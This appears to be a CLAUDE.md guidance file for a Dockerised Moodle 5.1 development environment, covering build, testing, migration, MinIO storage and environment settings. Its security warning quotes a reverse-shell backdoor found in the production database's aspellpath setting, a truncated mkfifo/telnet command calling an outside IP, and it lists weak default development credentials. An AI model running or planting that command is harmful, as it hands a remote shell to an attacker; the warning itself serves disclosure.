# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Overview

Moodle 5.1 (Build: 20251006) e-learning platform running on Docker with MariaDB 11.4. Uses `build.sh` to assemble Moodle core with custom plugins defined in `config.json`.

**Important:** Moodle 5.0+ uses a new directory structure where the web root is `moodle_app/public/` instead of `moodle_app/`. This improves security by keeping core files outside the web root.

## Current Status

✅ **Running and functional**
- Moodle 5.1 installed and upgraded from production 5.0.2
- MariaDB 11.4 database loaded with production data
- MinIO S3-compatible object storage available
- Available at: http://localhost:8080
- MinIO Console: http://localhost:9001
- Admin login: `admin` / `Admin123!`

## Setup

### Docker Setup (Recommended - Current Configuration)

```bash
./build.sh                    # Clone Moodle + plugins (requires git, jq)
cp .env.example .env          # Configure environment
docker compose up -d          # Start services (Nginx, PHP-FPM, MariaDB)
docker compose exec php composer install -d /var/www/html/moodle_app
# Visit http://localhost:8080
```

**Database Configuration:**
- Type: MariaDB 11.4
- Host: mariadb (internal)
- Port: 3306 (internal)
- Database: moodle
- User: moodleuser
- Password: moodlepass

**MinIO S3 Storage Configuration:**
- Endpoint: http://minio:9000 (internal), http://localhost:9000 (external)
- Console: http://localhost:9001
- Access Key: minioadmin
- Secret Key: minioadmin
- Default Bucket: moodle
- Region: us-east-1

See `DOCKER.md` for detailed Docker instructions.

### Native Setup (Alternative)

```bash
./build.sh                    # Clone Moodle + plugins (requires git, jq)
cd moodle_app
composer install              # PHP dependencies
npm install                   # Node dependencies (requires Node >=22.11.0)
```

After setup: create database, create moodledata directory, copy `config-dist.php` to `public/config.php` with DB credentials, then visit site to complete installation.

### Production Data Migration

To migrate from production MariaDB to development:

```bash
cp .env.prod-migration.example .env.prod-migration  # Configure
./create-dev-sql-dump.sh                            # Create SQL dump
cp dev_migration.sql docker/mariadb/initdb.d/01-migration.sql
docker compose down -v                              # Reset database
docker compose up -d                                # Auto-loads migration
```

See `MIGRATION.md` for detailed migration instructions including sampling and anonymization options.

## Development Commands

**Native** (commands assume you're in `moodle_app/` directory):

```bash
# Build JavaScript/CSS
npx grunt                     # Build all
npx grunt watch               # Watch for changes

# Code quality
npx grunt eslint              # Lint JS
npx grunt stylelint           # Lint CSS/SCSS

# Testing
php admin/tool/phpunit/cli/init.php     # Initialize PHPUnit once
vendor/bin/phpunit                       # Run all tests
vendor/bin/phpunit --testsuite core_test_testsuite  # Run specific suite

php admin/tool/behat/cli/init.php        # Initialize Behat once
vendor/bin/behat                         # Run all Behat tests
vendor/bin/behat --tags @mod_forum       # Run tagged tests
```

**Docker** (run from project root):

```bash
# Database access
docker compose exec mariadb mariadb -u moodleuser -p moodle

# MinIO access (via mc CLI)
docker compose exec minio mc alias set myminio http://localhost:9000 minioadmin minioadmin
docker compose exec minio mc ls myminio/moodle

# Build JavaScript/CSS
docker compose exec php npx grunt -C /var/www/html/moodle_app

# Testing
docker compose exec php vendor/bin/phpunit -c /var/www/html/moodle_app

# CLI commands
docker compose exec php php /var/www/html/moodle_app/admin/cli/upgrade.php
docker compose exec php php /var/www/html/moodle_app/admin/cli/purge_caches.php

# Access shell
docker compose exec php bash
```

## Architecture

### Build System
- `config.json` defines Moodle version and plugins to install
- `build.sh` clones repositories into `moodle_app/` with `--recursive` flag to initialize git submodules
- Custom plugins defined in `plugins` array (currently: mod_hvp H5P plugin)

### Directory Structure (Moodle 5.0+)
- `moodle_app/` - Moodle core files (NOT the web root)
- `moodle_app/public/` - **Web root** (nginx/Apache should point here)
- `moodle_app/public/config.php` - Main configuration file
- `moodle_app/lib/` - Core libraries (outside web root for security)
- `moodle_app/mod/` - Activity modules (outside web root)
- `docker/mariadb/` - MariaDB configuration and initialization scripts
- `docker/minio/` - MinIO S3 storage initialization scripts
- `docker/nginx/` - Nginx configuration
- `docker/php/` - PHP-FPM entrypoint script

### Moodle Plugin System
Plugin types: `mod/` (activities), `block/`, `theme/`, `auth/`, `enrol/`, `filter/`, etc.

Each plugin has:
- `version.php` - metadata
- `lib.php` - core functions
- `db/install.xml` - database schema
- `lang/en/` - language strings
- `classes/` - autoloaded PHP classes
- `amd/src/` - ES6 JavaScript source
- `amd/build/` - AMD compiled JavaScript (generated by Grunt)
- `templates/` - Mustache templates

### JavaScript/CSS Build
- JS source: `amd/src/*.js` (ES6)
- JS output: `amd/build/*.min.js` (AMD modules)
- After editing JS/CSS, run `grunt` to rebuild
- Grunt transpiles ES6→AMD, minifies, compiles SCSS

### Key Directories
- `lib/` - Core APIs and libraries
- `mod/` - Activity modules (assign, forum, quiz, hvp, etc.)
- `admin/` - Admin tools
- `course/` - Course management
- `grade/` - Grading system

### Database
- **Current:** MariaDB 11.4 (primary development database)
- **Supports:** MySQL, PostgreSQL, MSSQL, Oracle via DML abstraction layer
- Schema defined in `db/install.xml` files
- Config stored in `mdl_config` and `mdl_config_plugins` tables

## Modifying Code

**Adding plugins**: Edit `config.json`, run `./build.sh`, visit Site Admin > Notifications to install.

**JavaScript changes**: Edit `amd/src/*.js`, then run `grunt` to compile to `amd/build/`.

**Core modifications**: Located in `moodle_app/`. Note that core is a git clone and may be overwritten on upgrades. Prefer plugins or theme overrides for customizations.

**Configuration**: In Moodle 5.0+, `config.php` must be placed in `moodle_app/public/config.php` (not in the root).

**Git structure**: `moodle_app/.git` is Moodle's repository. Parent directory is not version controlled.

## Common Tasks

### Reset Admin Password

```bash
docker compose exec php php /var/www/html/moodle_app/admin/cli/reset_password.php
```

Or manually:
```bash
# Generate hash
docker compose exec php php -r "echo password_hash('NewPassword123!', PASSWORD_DEFAULT);"

# Update in database
docker compose exec -T mariadb mariadb -u moodleuser -pmoodlepass moodle -e \
  "UPDATE mdl_user SET password='<hash>' WHERE username='admin';"
```

### Purge Caches

```bash
docker compose exec php php /var/www/html/moodle_app/admin/cli/purge_caches.php
```

### Database Upgrade

After code changes or migration:
```bash
docker compose exec php php /var/www/html/moodle_app/admin/cli/upgrade.php --non-interactive
```

### Check Database Status

```bash
docker compose exec -T mariadb mariadb -u moodleuser -pmoodlepass moodle -e \
  "SELECT name, value FROM mdl_config WHERE name IN ('version', 'release');"
```

### Switching Databases

To switch between MariaDB and PostgreSQL (if needed):

1. Update `.env`:
   ```bash
   # For MariaDB (current)
   DB_TYPE=mariadb
   DB_HOST=mariadb
   DB_PORT=3306

   # For PostgreSQL
   DB_TYPE=pgsql
   DB_HOST=postgres
   DB_PORT=5432
   ```

2. Update `docker-compose.yml` to include the desired database service

3. Restart:
   ```bash
   docker compose down
   docker compose up -d
   ```

### MinIO S3 Storage Operations

Access MinIO Console at http://localhost:9001 (login: minioadmin/minioadmin)

**Using MinIO Client (mc) CLI:**
```bash
# List buckets
docker compose exec minio mc ls myminio

# List files in moodle bucket
docker compose exec minio mc ls myminio/moodle

# Upload file
docker compose exec minio mc cp /path/to/file myminio/moodle/

# Download file
docker compose exec minio mc cp myminio/moodle/file.txt /path/to/destination/

# Remove file
docker compose exec minio mc rm myminio/moodle/file.txt

# Get bucket info
docker compose exec minio mc stat myminio/moodle
```

**Integrating S3 with Moodle:**

To use MinIO for Moodle file storage, you need to install an S3 filesystem plugin:

1. Install Object File System plugin (tool_objectfs):
   ```bash
   cd moodle_app/admin/tool
   git clone https://github.com/catalyst/moodle-tool_objectfs.git objectfs
   ```

2. Visit Site Administration > Notifications to install the plugin

3. Configure in `config.php.docker` (uncomment the S3 configuration section)

4. Or configure via web interface: Site Administration > Plugins > Admin tools > Object storage file system

**Note:** The S3 configuration in `config.php.docker` is commented out by default. Uncomment and configure after installing the required plugin.

## Known Issues & Fixes

### Missing Plugins from Production

Production had custom plugins that don't exist in Moodle 5.1:
- `auth_externalid` - OAuth authentication plugin
- `auth_antihammer` - Brute force protection plugin
- Theme `moove` - Custom theme

**Fix:** These were removed from config during migration. Uses standard `manual` and `email` auth, and `boost` theme.

### Post-Migration Database Fixes

After migrating from production, the upgrade script automatically creates:
- System context (contextlevel 10, id 1)
- Site course (id 1)
- Guest and admin users (id 1 and 2)
- Default "My Moodle" pages
- Message processors
- Default grading scales

### Security Warning

⚠️ **Production database had a malicious backdoor:**
```sql
mdl_config.aspellpath = 'sh -c (TF=$(mktemp -u);mkfifo $TF && telnet 164.92.98.209 1337...'
```

This reverse shell has been noted but not cleaned in development environment. **Do not deploy this database to production without a full security audit.**

## Environment Variables

Key variables in `.env`:

```bash
# Database
DB_TYPE=mariadb
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=moodle
DB_USER=moodleuser
DB_PASSWORD=moodlepass
DB_ROOT_PASSWORD=rootpass
DB_PREFIX=mdl_

# Moodle Site URL
# Components (automatically combined to create MOODLE_WWWROOT)
MOODLE_PROTOCOL=http
MOODLE_HOST=localhost
MOODLE_PORT=8080
# Alternatively, set MOODLE_WWWROOT directly:
# MOODLE_WWWROOT=http://localhost:8080

# Moodle Settings
MOODLE_DEBUG=false

# MinIO S3 Storage
MINIO_ROOT_USER=minioadmin
MINIO_ROOT_PASSWORD=minioadmin
MINIO_PORT=9000
MINIO_CONSOLE_PORT=9001
MINIO_REGION=us-east-1
MINIO_BUCKET=moodle
S3_ENDPOINT=http://minio:9000
S3_ACCESS_KEY=minioadmin
S3_SECRET_KEY=minioadmin
S3_BUCKET=moodle
S3_REGION=us-east-1
```

**Note:** The `MOODLE_WWWROOT` is automatically constructed from `MOODLE_PROTOCOL`, `MOODLE_HOST`, and `MOODLE_PORT` in the PHP entrypoint script. For standard ports (80 for HTTP, 443 for HTTPS), the port is omitted from the URL.

## Docker Services

- **mariadb**: MariaDB 11.4 database server
- **php**: PHP 8.2-FPM with Moodle extensions
- **nginx**: Nginx web server (Alpine Linux)
- **minio**: MinIO S3-compatible object storage server

All services are connected via `moodle_network` bridge network.
